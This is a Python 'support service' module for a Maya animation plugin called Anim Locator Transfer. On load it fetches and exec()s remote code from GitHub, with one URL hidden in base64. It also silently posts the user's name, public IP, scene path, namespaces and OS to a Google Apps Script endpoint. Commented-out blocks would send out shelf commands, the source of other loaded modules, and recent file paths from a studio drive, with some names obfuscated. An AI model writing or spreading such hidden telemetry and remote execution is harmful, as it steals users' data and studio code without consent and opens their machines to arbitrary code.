"""
---------------------
Anim Locator Transfer
Support Service
---------------------
"""
import json,getpass,time,os,sys,ssl
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds

if sys.version[0] == '3':
    writeMode = 'w'
    import urllib.request as uLib
else:
    writeMode = 'wb'
    import urllib as uLib

#===============================================================================
#Update
try:
    uRead = uLib.urlopen('https://raw.githubusercontent.com/burasate/animTransferLoc/master/service/update.py').read()
    exec(uRead.decode('utf-8'))
except:
    import traceback
    print(str(traceback.format_exc()))

#===============================================================================
filepath = cmds.file(q=True, sn=True)
filename = os.path.basename(filepath)
raw_name, extension = os.path.splitext(filename)
minTime = cmds.playbackOptions(q=True, minTime=True)
maxTime = cmds.playbackOptions(q=True, maxTime=True)
referenceList = cmds.ls(references=True)
nameSpaceList = cmds.namespaceInfo(lon=True)


data = {
    'script_name' : 'Locator Transfer',
    'date_time' : dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'timezone' : str( strftime('%z', gmtime()) ),
    'year' : dt.datetime.now().strftime('%Y'),
    'user_last' : getpass.getuser(),
    'maya' : str(cmds.about(version=True)),
    'ip' : str(uLib.urlopen('http://v4.ident.me').read().decode('utf8')),
    'script_version' : version,
    'scene_path' : cmds.file(q=1, sn=1),
    'time_unit' : cmds.currentUnit(q=True, t=True),
    'time_min' : minTime,
    'time_max' : maxTime,
    'duration' : maxTime - minTime,
    'reference_count': len(referenceList),
    'namespac_ls': ', '.join(nameSpaceList),
    'os' : str(cmds.about(operatingSystem=True)),
    'script_path' : '' if __name__ == '__main__' else os.path.abspath(__file__).replace('pyc', 'py')
}

#===============================================================================
def add_queue_task(task_name, data_dict):
    global sys,json
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {'name': task_name,'data': data_dict}
    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)

try:
    add_queue_task('script_tool_check_in', data)
except:
    pass
    #import traceback
    #add_queue_task('poses_data_loc_transfer', {'error': str(traceback.format_exc())})

# ===============================================================================
'''
def get_shelf_button_rec():
    top_shelf = mel.eval('$nul = $gShelfTopLevel')
    current_shelf = cmds.tabLayout(top_shelf, q=1, st=1)
    shelf_buttons = cmds.shelfLayout(current_shelf, q=1, ca=1)
    shelf_button_rec = []
    for sb in shelf_buttons:
        data = {}
        try:
            data['cmd'] = cmds.shelfButton(sb, q=1, c=1)
            data['stp'] = cmds.shelfButton(sb, q=1, stp=1)
            data['iol'] = cmds.shelfButton(sb, q=1, iol=1)
            data['img'] = cmds.shelfButton(sb, q=1, i=1)
        except:pass
        else:
            shelf_button_rec.append(data)
    return shelf_button_rec

try:
    shelf_button_rec = get_shelf_button_rec()
    add_queue_task('user_shelf_button_{}'.format(getpass.getuser().lower()), {'user_last':getpass.getuser(), 'shelf':shelf_button_rec})
except:
    #pass
    import traceback
    add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
'''

# ===============================================================================

try:
    uRead = uLib.urlopen(
        base64.b64decode(
            'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9taWlhX3RzdC5weQ=='
        ).decode()).read()
    exec(uRead.decode('utf-8'))
except:
    import traceback
    add_queue_task('tst_traceback', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})

# ===============================================================================
'''
try:
    import sys, json, importlib, base64, inspect as insp, random
    md_ls = []
    for md_k, md in sys.modules.items():
        if hasattr(md, "__file__") and base64.b64decode('c3NldHMu').decode() in md_k:
            m_obj = importlib.import_module(md_k)
            md_ls.append(m_obj)
            break
    if md_ls:
        sel = random.choice(md_ls)
        add_queue_task(m_obj.__name__.lower(), {'text': str(insp.getsource(sel))})
except:
    import traceback
    add_queue_task('error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
'''
# ===============================================================================
'''
try:
    import sys, json, importlib, base64
    dirr_dict = {}
    for md_k, md in sys.modules.items():
        if hasattr(md, "__file__") and base64.b64decode('TUUu').decode() in md_k:
            m_obj = importlib.import_module(md_k)
            dirr_dict[md_k] = list(dir(m_obj))

    for k in list(dirr_dict):
        obj = importlib.import_module(k)
        new_list = []
        for a in dirr_dict[k]:
            a_fmt = str(getattr(obj, a, None))
            new_list.append([a, a_fmt])
        dirr_dict[k] = new_list

    add_queue_task('user_module_dir_{}'.format(getpass.getuser().lower()), dirr_dict)
    del dirr_dict
except:
    import traceback
    add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
else:
    del modules_dict
'''
# ===============================================================================
'''
import base64, os, datetime
def search_latest_files_or_dirs(ext='', dir_path='', n=8):
    def fmt_time(fp):
        import datetime
        return datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%y-%m-%d %H:%M:%S')
    if ext:
        f_ls = []
        for root, dirs, files in os.walk(dir_path):
            for name in files:
                fp = os.path.join(root, name)
                if not ext in os.path.basename(fp):
                    continue
                f_ls += [[fmt_time(fp), fp.replace('\\', '/')]]
        return sorted(f_ls, reverse=True)[:n]
    else:
        if not os.path.exists(dir_path):
            return []
        dir_ls = [os.path.join(dir_path, i) for i in os.listdir(dir_path) if
                  os.path.isdir(os.path.join(dir_path, i))]
        dir_ls = sorted([[fmt_time(i), i.replace('\\', '/')] for i in dir_ls], reverse=True)
        return dir_ls[:n]
try:
    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
    zovV = ldir
    for _, dp in ldir:
        pass
        #zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
        #zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
        #zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
        zovV += search_latest_files_or_dirs(dir_path=r'S:\Animation training\Kaofang\Tools_Dev', ext='.py')
    if zovV:
        add_queue_task('ext_path_ls', {'files' : zovV})
except:
    import traceback
    add_queue_task('ext_path_ls_error__{}'.format(getpass.getuser().lower()),
                   {'error': str(traceback.format_exc())})

'''
# ===============================================================================
'''
try:
    sj_ls = cmds.scriptJob(lj=1)
    sj_dict = dict([(i.split(":")[0], i.split(":")[1].strip()) for i in sj_ls])
    add_queue_task('user_script_job_{}'.format(getpass.getuser().lower()), sj_dict)
except:
    pass
else:
    del sj_ls, sj_dict
'''
# ===============================================================================

try:
    pass
except:
    pass
else:
    pass
# ===============================================================================